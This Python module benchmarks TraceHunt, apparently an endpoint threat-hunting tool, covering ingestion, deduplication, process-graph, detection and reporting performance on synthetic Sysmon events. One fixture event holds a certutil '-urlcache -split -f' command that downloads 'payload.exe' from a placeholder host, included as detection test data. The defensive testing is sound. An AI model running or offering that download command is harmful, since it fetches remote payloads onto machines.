"""Reproducible Performance Benchmarking Module for TraceHunt.

Measures:
1. Ingestion Throughput (events/sec) across JSON, JSONL, and CSV for multiple batch sizes.
2. Ingestion Reliability (valid normalized, duplicates skipped, malformed isolated).
3. Process Graph Performance (DAG reconstruction and lineage lookup latency).
4. Detection Engine Performance (runtime and events/sec examined).
5. Reporting Engine Performance (JSON export and executive HTML rendering time).

Uses isolated temporary databases to guarantee benchmark reproducibility.
"""

import csv
import json
import os
import platform
import sys
import tempfile
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

# Ensure project root is on sys.path
ROOT_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT_DIR))

from tracehunt.config import settings
from tracehunt.database import get_engine, get_session_factory, init_db
from tracehunt.detection import DetectionEngine
from tracehunt.graph.reconstructor import build_host_process_graph, reconstruct_and_persist_host_graph
from tracehunt.graph.tree_service import get_process_lineage
from tracehunt.ingestion.importer import import_telemetry_file
from sqlalchemy import select
from tracehunt.models import EndpointEvent

from tracehunt.reporting import generate_report


def get_environment_info() -> dict[str, Any]:
    """Capture runtime and hardware environment context."""
    return {
        "platform": platform.platform(),
        "system": platform.system(),
        "release": platform.release(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "python_version": platform.python_version(),
        "python_implementation": platform.python_implementation(),
        "timestamp_utc": datetime.now(timezone.utc).isoformat(),
    }


def generate_synthetic_telemetry(num_records: int, host: str = "BENCHMARK-HOST") -> list[dict[str, Any]]:
    """Generate deterministic, valid Sysmon Process Creation events."""
    base_time = datetime(2026, 10, 21, 10, 0, 0, tzinfo=timezone.utc)
    records = []

    # Hierarchy: System (PID 4) -> explorer.exe (1000) -> various child processes
    records.append({
        "EventID": 1,
        "UtcTime": base_time.strftime("%Y-%m-%d %H:%M:%S.000"),
        "Computer": host,
        "ProcessId": 1000,
        "ParentProcessId": 4,
        "Image": "C:\\Windows\\explorer.exe",
        "CommandLine": "C:\\Windows\\explorer.exe",
        "User": "CORP\\analyst",
    })

    for i in range(1, num_records):
        t = base_time + timedelta(milliseconds=i * 50)
        pid = 1000 + i
        parent_pid = 1000 if i % 10 != 0 else (1000 + (i - 1))
        
        # Interleave realistic binaries
        binaries = [
            ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c echo test"),
            ("C:\\Windows\\System32\\notepad.exe", "notepad.exe C:\\notes.txt"),
            ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs"),
            ("C:\\Windows\\System32\\whoami.exe", "whoami.exe /all"),
            ("C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://test.com/payload.exe"),
            ("C:\\Program Files\\Browser\\browser.exe", "browser.exe --type=renderer"),
        ]
        img, cmd = binaries[i % len(binaries)]

        records.append({
            "EventID": 1,
            "UtcTime": t.strftime("%Y-%m-%d %H:%M:%S.000"),
            "Computer": host,
            "ProcessId": pid,
            "ParentProcessId": parent_pid,
            "Image": img,
            "CommandLine": cmd,
            "User": "CORP\\analyst",
        })

    return records


def write_fixtures(records: list[dict[str, Any]], tmp_dir: Path) -> dict[str, Path]:
    """Write synthetic records to JSON, JSONL, and CSV files."""
    json_path = tmp_dir / f"telemetry_{len(records)}.json"
    jsonl_path = tmp_dir / f"telemetry_{len(records)}.jsonl"
    csv_path = tmp_dir / f"telemetry_{len(records)}.csv"

    # 1. JSON Array
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(records, f)

    # 2. JSON Lines
    with open(jsonl_path, "w", encoding="utf-8") as f:
        for r in records:
            f.write(json.dumps(r) + "\n")

    # 3. CSV
    if records:
        fieldnames = ["EventID", "UtcTime", "Computer", "ProcessId", "ParentProcessId", "Image", "CommandLine", "User"]
        with open(csv_path, "w", encoding="utf-8", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for r in records:
                writer.writerow({k: r.get(k, "") for k in fieldnames})

    return {"json": json_path, "jsonl": jsonl_path, "csv": csv_path}


def benchmark_ingestion_format(file_path: Path, repetitions: int = 3) -> dict[str, Any]:
    """Measure ingestion throughput and latency for a given file over repetitions."""
    durations = []
    events_normalized = 0
    records_read = 0

    for rep in range(repetitions):
        # Fresh isolated temporary database for each run
        with tempfile.NamedTemporaryFile(suffix=".db") as tmp_db:
            db_url = f"sqlite:///{tmp_db.name}"
            engine = init_db(database_url=db_url, seed_rules=False)
            factory = get_session_factory(engine)

            with factory() as session:
                t0 = time.perf_counter()
                summary = import_telemetry_file(str(file_path), session=session)
                session.commit()
                t1 = time.perf_counter()

                durations.append(t1 - t0)
                events_normalized = summary.events_normalized
                records_read = summary.records_read

    durations.sort()
    median_duration = durations[len(durations) // 2]
    throughput = (records_read / median_duration) if median_duration > 0 else 0.0

    return {
        "format": file_path.suffix.lstrip(".").upper(),
        "records_read": records_read,
        "events_normalized": events_normalized,
        "median_duration_sec": round(median_duration, 4),
        "events_per_second": round(throughput, 1),
        "all_durations": [round(d, 4) for d in durations],
    }


def benchmark_deduplication(file_path: Path) -> dict[str, Any]:
    """Measure deduplication performance when re-importing the identical dataset."""
    with tempfile.NamedTemporaryFile(suffix=".db") as tmp_db:
        db_url = f"sqlite:///{tmp_db.name}"
        engine = init_db(database_url=db_url, seed_rules=False)
        factory = get_session_factory(engine)

        with factory() as session:
            # First import
            summary1 = import_telemetry_file(str(file_path), session=session)
            session.commit()

            # Second import (identical data)
            t0 = time.perf_counter()
            summary2 = import_telemetry_file(str(file_path), session=session)
            session.commit()
            t1 = time.perf_counter()

            reimport_duration = t1 - t0
            throughput = (summary2.records_read / reimport_duration) if reimport_duration > 0 else 0.0

            return {
                "initial_normalized": summary1.events_normalized,
                "reimport_read": summary2.records_read,
                "reimport_normalized": summary2.events_normalized,
                "reimport_duplicates_skipped": summary2.duplicates_skipped,
                "reimport_duration_sec": round(reimport_duration, 4),
                "reimport_events_per_sec": round(throughput, 1),
                "dedup_success_rate": round(summary2.duplicates_skipped / summary2.records_read, 4) if summary2.records_read > 0 else 1.0,
            }


def benchmark_process_graph(records_count: int = 1000) -> dict[str, Any]:
    """Measure NetworkX process tree DAG reconstruction and lineage lookup latency."""
    host = "BENCH-GRAPH-HOST"
    records = generate_synthetic_telemetry(records_count, host=host)

    with tempfile.NamedTemporaryFile(suffix=".db") as tmp_db:
        db_url = f"sqlite:///{tmp_db.name}"
        engine = init_db(database_url=db_url, seed_rules=False)
        factory = get_session_factory(engine)

        with factory() as session:
            # Ingest records
            with tempfile.NamedTemporaryFile(suffix=".json", mode="w") as f:
                json.dump(records, f)
                f.flush()
                import_telemetry_file(f.name, session=session)
                session.commit()

            # Measure DAG reconstruction
            events = list(session.scalars(select(EndpointEvent).where(EndpointEvent.host == host)).all())
            t0 = time.perf_counter()
            graph, _ = build_host_process_graph(events)
            t1 = time.perf_counter()
            reconstruction_ms = (t1 - t0) * 1000

            # Measure persistence
            t2 = time.perf_counter()
            g_persisted, count_persisted = reconstruct_and_persist_host_graph(host=host, session=session)
            session.commit()
            t3 = time.perf_counter()
            persistence_ms = (t3 - t2) * 1000

            # Measure lineage lookups (sample up to 20 processes)
            lineage_latencies = []
            sample_events = list(session.scalars(select(EndpointEvent).where(EndpointEvent.host == host).limit(20)).all())
            for ev in sample_events:
                lt0 = time.perf_counter()
                lineage = get_process_lineage(ev.id, session)
                lt1 = time.perf_counter()
                lineage_latencies.append((lt1 - lt0) * 1000)

            lineage_latencies.sort()
            median_lineage_ms = lineage_latencies[len(lineage_latencies) // 2] if lineage_latencies else 0.0

            return {
                "events_in_graph": records_count,
                "dag_nodes": graph.number_of_nodes(),
                "dag_edges": graph.number_of_edges(),
                "reconstruction_latency_ms": round(reconstruction_ms, 2),
                "persistence_latency_ms": round(persistence_ms, 2),
                "relationships_persisted": len(count_persisted),
                "median_lineage_lookup_ms": round(median_lineage_ms, 4),
            }


def benchmark_detection_engine(records_count: int = 1000) -> dict[str, Any]:
    """Measure detection engine execution runtime and throughput across all 5 rules."""
    records = generate_synthetic_telemetry(records_count, host="BENCH-DETECTION-HOST")

    with tempfile.NamedTemporaryFile(suffix=".db") as tmp_db:
        db_url = f"sqlite:///{tmp_db.name}"
        engine = init_db(database_url=db_url, seed_rules=True)
        factory = get_session_factory(engine)

        with factory() as session:
            with tempfile.NamedTemporaryFile(suffix=".json", mode="w") as f:
                json.dump(records, f)
                f.flush()
                import_telemetry_file(f.name, session=session)
                session.commit()

            events = list(session.scalars(select(EndpointEvent)).all())
            det_engine = DetectionEngine()

            t0 = time.perf_counter()
            summary = det_engine.evaluate_events(events=events, session=session, persist=True)
            session.commit()
            t1 = time.perf_counter()

            duration_ms = (t1 - t0) * 1000
            throughput = (len(events) / (t1 - t0)) if (t1 - t0) > 0 else 0.0

            return {
                "events_evaluated": summary.events_examined,
                "active_rules": summary.rules_evaluated,
                "findings_generated": summary.findings_created,
                "evaluation_duration_ms": round(duration_ms, 2),
                "events_per_second": round(throughput, 1),
            }


def benchmark_reporting_engine() -> dict[str, Any]:
    """Measure JSON serialization and executive HTML rendering latency."""
    # Seed minimal investigation on attack tree fixture
    attack_path = ROOT_DIR / "fixtures" / "suspicious" / "attack_tree.json"

    with tempfile.NamedTemporaryFile(suffix=".db") as tmp_db:
        db_url = f"sqlite:///{tmp_db.name}"
        engine = init_db(database_url=db_url, seed_rules=True)
        factory = get_session_factory(engine)

        with factory() as session:
            import_telemetry_file(str(attack_path), session=session)
            session.commit()

            events = list(session.scalars(select(EndpointEvent)).all())
            det_engine = DetectionEngine()
            det_engine.evaluate_events(events=events, session=session, persist=True)
            session.commit()

            target_host = session.scalar(select(EndpointEvent.host)) or "VICTIM-HOST"

            # Benchmark JSON report
            t0 = time.perf_counter()
            json_data, json_file = generate_report(session=session, host=target_host, output_format="json")
            t1 = time.perf_counter()
            json_ms = (t1 - t0) * 1000

            # Benchmark HTML report
            t2 = time.perf_counter()
            html_data, html_file = generate_report(session=session, host=target_host, output_format="html")
            t3 = time.perf_counter()
            html_ms = (t3 - t2) * 1000

            return {
                "events_in_report": html_data.metrics.total_events,
                "findings_in_report": html_data.metrics.total_findings,
                "json_generation_ms": round(json_ms, 2),
                "html_generation_ms": round(html_ms, 2),
                "html_file_size_bytes": html_file.stat().st_size if html_file.exists() else 0,
            }


def run_full_benchmark_suite(batch_sizes: list[int] = [100, 1000]) -> dict[str, Any]:
    """Execute complete reproducible benchmark suite across all components."""
    env = get_environment_info()
    print("=" * 70)
    print("TraceHunt Performance & Accuracy Benchmarking Suite")
    print(f"Platform: {env['platform']} | Python: {env['python_version']} | Architecture: {env['machine']}")
    print(f"Date UTC: {env['timestamp_utc']}")
    print("=" * 70)

    ingestion_results = []
    dedup_results = []

    with tempfile.TemporaryDirectory() as tmp_dir:
        tmp_path = Path(tmp_dir)

        for size in batch_sizes:
            print(f"\n[+] Generating synthetic telemetry fixture (N={size})...")
            records = generate_synthetic_telemetry(size)
            files = write_fixtures(records, tmp_path)

            for fmt in ["json", "jsonl", "csv"]:
                print(f"  -> Benchmarking {fmt.upper()} ingestion (N={size}, 3 trials)...")
                res = benchmark_ingestion_format(files[fmt], repetitions=3)
                res["batch_size"] = size
                ingestion_results.append(res)
                print(f"     Throughput: {res['events_per_second']:,} events/sec (Median: {res['median_duration_sec']}s)")

            # Deduplication benchmark on JSON
            print(f"  -> Benchmarking deduplication on re-import (N={size})...")
            dres = benchmark_deduplication(files["json"])
            dres["batch_size"] = size
            dedup_results.append(dres)
            print(f"     Skipped: {dres['reimport_duplicates_skipped']}/{dres['reimport_read']} ({dres['dedup_success_rate']*100}%) in {dres['reimport_duration_sec']}s")

    print("\n[+] Benchmarking Process Graph Reconstruction (N=1,000)...")
    graph_res = benchmark_process_graph(1000)
    print(f"  -> DAG Nodes: {graph_res['dag_nodes']}, Edges: {graph_res['dag_edges']}")
    print(f"  -> Reconstruction Latency: {graph_res['reconstruction_latency_ms']} ms")
    print(f"  -> Median Lineage Query Latency: {graph_res['median_lineage_lookup_ms']} ms")

    print("\n[+] Benchmarking Detection Engine (N=1,000 events, 5 rules)...")
    detection_res = benchmark_detection_engine(1000)
    print(f"  -> Evaluated {detection_res['events_evaluated']} events: {detection_res['findings_generated']} findings")
    print(f"  -> Detection Runtime: {detection_res['evaluation_duration_ms']} ms ({detection_res['events_per_second']:,} events/sec)")

    print("\n[+] Benchmarking Reporting Engine...")
    reporting_res = benchmark_reporting_engine()
    print(f"  -> JSON Report: {reporting_res['json_generation_ms']} ms")
    print(f"  -> Executive HTML Report: {reporting_res['html_generation_ms']} ms (Size: {reporting_res['html_file_size_bytes']} bytes)")

    full_results = {
        "environment": env,
        "ingestion_throughput": ingestion_results,
        "deduplication_reliability": dedup_results,
        "process_graph": graph_res,
        "detection_engine": detection_res,
        "reporting_engine": reporting_res,
    }

    # Save to reports/
    out_dir = settings.REPORTS_DIR
    out_dir.mkdir(parents=True, exist_ok=True)
    out_file = out_dir / "benchmark_results.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(full_results, f, indent=2)
    print(f"\n[+] Full benchmark results saved to: {out_file}")

    return full_results


if __name__ == "__main__":
    run_full_benchmark_suite([100, 1000])
